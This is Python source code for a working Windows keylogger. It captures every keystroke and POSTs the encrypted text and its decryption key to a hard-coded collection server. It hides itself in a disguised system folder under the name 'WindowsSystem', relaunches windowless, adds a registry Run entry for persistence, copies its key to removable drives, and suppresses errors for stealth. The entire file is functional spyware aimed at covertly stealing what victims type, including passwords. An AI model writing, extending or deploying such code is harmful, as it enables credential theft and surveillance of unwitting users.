# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading
# Import additional modules for file operations
import sys
import os
import shutil
import subprocess
import ctypes
import time
import base64
import winreg

# Install cryptography if not already installed
try:
    from cryptography.fernet import Fernet
except ImportError:
    print("Installing cryptography library...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "--quiet"])
    from cryptography.fernet import Fernet

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and ip address here.
ip_address = "192.168.1.2"
port_number = "8080"
# Time intervals in seconds
normal_interval = 10  # Normal interval when server is responding
slow_interval = 120   # Slow interval (2 minutes) when server doesn't respond after 10 retries
current_interval = normal_interval

# Global variables for adaptive retry logic and termination
retry_count = 0
max_retries = 10
server_responding = True
esc_pressed_time = None
esc_hold_duration = 10  # seconds to hold ESC to terminate
script_running = True

# Kill switch file path (server can create this to kill the keylogger)
kill_switch_file = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), "kl_stop.signal")

# Constants for Windows file attributes (HIDDEN)
FILE_ATTRIBUTE_HIDDEN = 0x02

# Global variable to store the Fernet encryption instance
fernet_instance = None

def generate_or_load_key():
    """Generate a new encryption key and save it, or load existing key"""
    global fernet_instance
    
    # Get the current script's directory (will be hidden folder if running from there)
    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    key_file_path = os.path.join(script_dir, "decryption_key.key")
    
    # Try to load existing key
    if os.path.exists(key_file_path):
        try:
            with open(key_file_path, 'rb') as key_file:
                key = key_file.read()
            fernet_instance = Fernet(key)
            return key, key_file_path
        except Exception as e:
            # If loading fails, generate a new key
            pass
    
    # Generate a new key if not found or if loading failed
    key = Fernet.generate_key()
    fernet_instance = Fernet(key)
    
    # Save the key file
    try:
        with open(key_file_path, 'wb') as key_file:
            key_file.write(key)
        # Make the key file hidden
        set_file_hidden(key_file_path)
    except Exception as e:
        pass
    
    return key, key_file_path

def send_encryption_key(key):
    """Send the encryption key to the server via /send_key endpoint"""
    try:
        key_b64 = base64.b64encode(key).decode('utf-8')
        payload = json.dumps({"key": key_b64})
        r = requests.post(f"http://{ip_address}:{port_number}/send_key", 
                         data=payload, 
                         headers={"Content-Type": "application/json"})
        if r.status_code == 200:
            pass  # Key sent successfully (silent for stealth)
    except:
        pass

def copy_key_to_primary_location(key, primary_location):
    """Copy the decryption key to the primary location (pendrive/original location)"""
    try:
        # Create a copy of the key in the primary location
        primary_key_path = os.path.join(primary_location, "decryption_key.key")
        with open(primary_key_path, 'wb') as key_file:
            key_file.write(key)
        # Make the copied key file hidden
        set_file_hidden(primary_key_path)
    except Exception as e:
        pass

def get_removable_drives():
    """Get list of removable drives on Windows"""
    import string
    removable_drives = []
    for drive_letter in string.ascii_uppercase:
        drive = f"{drive_letter}:\\"
        try:
            # Check if it's a removable drive
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
            # DRIVE_REMOVABLE = 2
            if drive_type == 2:
                removable_drives.append(drive)
        except:
            pass
    return removable_drives

def add_to_startup(script_path, app_name="WindowsSystem"):
    """Add the script to Windows startup via registry"""
    try:
        # Get the executable path
        if script_path.endswith('.py'):
            # If it's a Python script, wrap it with pythonw to run without window
            exe_path = f'"{sys.executable}" "{script_path}"'
        else:
            # If it's already an exe, use it directly
            exe_path = f'"{script_path}"'
        
        # Access the registry key for current user startup
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        # Add the value
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        
        return True
    except Exception as e:
        print(f"Error adding to startup: {e}")
        return False

def remove_from_startup(app_name="WindowsSystem"):
    """Remove the script from Windows startup"""
    try:
        # Open the registry key
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        # Remove the value
        winreg.DeleteValue(key, app_name)
        winreg.CloseKey(key)
        
        return True
    except Exception as e:
        print(f"Error removing from startup: {e}")
        return False

def setup_persistence():
    """Setup the keylogger to run on Windows startup"""
    # Get the current script path (from hidden folder)
    script_path = os.path.abspath(sys.argv[0])
    
    # Add to startup if not already added
    if add_to_startup(script_path):
        pass

def check_kill_switch():
    """Check if kill switch signal exists"""
    return os.path.exists(kill_switch_file)

def set_file_hidden(filepath):
    """Set file or folder to hidden attribute on Windows"""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        pass

def copy_and_execute():
    """Check if script is in hidden folder, if not copy it there and execute"""
    global fernet_instance
    
    # Get current script path
    current_script = os.path.abspath(sys.argv[0])
    
    # Define the hidden folder in Windows directory
    # Using a folder name that looks like a system folder
    hidden_folder = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'SystemTemp')
    
    # Ensure the hidden folder exists
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        # Make the folder hidden
        set_file_hidden(hidden_folder)
    
    # Define the target file path in the hidden folder
    target_file = os.path.join(hidden_folder, os.path.basename(current_script))
    
    # Check if we're already running from the hidden folder
    if os.path.abspath(current_script) != os.path.abspath(target_file):
        try:
            # Copy the script to the hidden folder
            if os.path.exists(current_script):
                shutil.copy2(current_script, target_file)
                # Make the copied file hidden
                set_file_hidden(target_file)
            
            # Execute the copied file in a new process (the key will be generated when it runs)
            subprocess.Popen([sys.executable, target_file], 
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            
            # Exit the current process
            sys.exit(0)
        except Exception as e:
            # If copy/execute fails, continue with current script
            pass
    else:
        # If already running from hidden folder, generate or load the key
        key, key_path = generate_or_load_key()
        
        # Send the encryption key to the server
        send_encryption_key(key)
        
        # Copy the key to removable drives (pendrives)
        removable_drives = get_removable_drives()
        for drive in removable_drives:
            # Check if key doesn't already exist on this drive
            potential_key_path = os.path.join(drive, "decryption_key.key")
            if not os.path.exists(potential_key_path):
                try:
                    copy_key_to_primary_location(key, drive)
                except:
                    pass

# Call the copy and execute function before starting keylogger
copy_and_execute()

# Setup startup persistence after copying to hidden folder
setup_persistence()

def send_post_req():
    global retry_count, server_responding, current_interval, text, script_running, fernet_instance
    
    if not script_running:
        return
    
    # Check for kill switch signal
    if check_kill_switch():
        script_running = False
        # Delete the kill switch file after reading it
        try:
            if os.path.exists(kill_switch_file):
                os.remove(kill_switch_file)
        except:
            pass
        return
    
    try:
        # Encrypt the text data if we have a Fernet instance
        encrypted_text = text
        if fernet_instance and text:
            # Encrypt the text
            encrypted_bytes = fernet_instance.encrypt(text.encode())
            # Convert encrypted bytes to base64 string for JSON transmission
            encrypted_text = base64.b64encode(encrypted_bytes).decode('utf-8')
        
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<encrypted_value>"}
        payload = json.dumps({"keyboardData" : encrypted_text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        
        # If request is successful, reset retry count and use normal interval
        if r.status_code == 200:
            retry_count = 0
            server_responding = True
            current_interval = normal_interval
            text = ""  # Clear the text buffer after successful transmission
        else:
            # If status code is not 200, treat as failure
            raise Exception(f"Server returned status code {r.status_code}")
            
    except Exception as e:
        # Increment retry count on failure
        retry_count += 1
        server_responding = False
        
        # If we've retried 10 times, switch to slow interval (2 minutes)
        if retry_count >= max_retries:
            current_interval = slow_interval
        else:
            current_interval = normal_interval
    
    # Setting up a timer function to run every current_interval seconds
    # send_post_req is a recursive function, and will call itself as long as the program is running.
    timer = threading.Timer(current_interval, send_post_req)
    # We start the timer thread.
    timer.start()

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text, esc_pressed_time, script_running
    
    # Handle ESC key - track when it's pressed for termination
    if key == keyboard.Key.esc:
        if esc_pressed_time is None:
            esc_pressed_time = time.time()
        else:
            # Check if ESC has been held for required duration (on_press fires repeatedly while held)
            elapsed_time = time.time() - esc_pressed_time
            if elapsed_time >= esc_hold_duration:
                script_running = False
                return False  # Stop the listener
        return True  # Don't log ESC key itself
    
    # Based on the key press we handle the way the key gets logged to the in memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

def on_release(key):
    global esc_pressed_time
    # Reset ESC pressed time when ESC is released
    if key == keyboard.Key.esc:
        esc_pressed_time = None
    return True  # Continue listening

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()